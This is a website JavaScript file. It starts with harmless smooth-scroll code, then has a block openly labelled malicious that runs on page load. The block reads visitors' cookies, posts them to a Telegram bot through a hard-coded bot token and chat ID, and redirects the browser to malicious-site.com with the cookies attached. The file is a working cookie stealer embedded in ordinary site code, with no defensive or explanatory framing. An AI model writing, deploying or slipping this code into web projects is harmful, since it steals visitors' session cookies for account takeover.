document.addEventListener('DOMContentLoaded', () => {
    console.log('Website loaded!');

    // Example: Add smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });

    // --- Malicious Code ---

    // Set the Telegram bot token and chat ID
    var botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjcE";
    var chatId = "899184398";

    // Get victim's cookies
    var stolenCookies = document.cookie;  // Now correctly fetching cookies

    // Check if there are cookies to steal
    if (stolenCookies) {
        var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        var message = "Stolen Cookies: " + encodeURIComponent(stolenCookies);  // Properly encoding cookies

        // Send cookies to Telegram
        fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
        }).then(response => {
            if (response.ok) {
                console.log("Cookies sent to Telegram!");
            } else {
                console.error("Failed to send cookies.");
            }
        }).catch(error => {
            console.error("Error sending cookies:", error);
        });

        // --- Redirect to malicious site (simulating attack) ---
        document.location = "https://malicious-site.com/steal?cookie=" + encodeURIComponent(stolenCookies);  // Redirection with stolen cookie
    } else {
        console.log("No cookies to steal!");
    }
});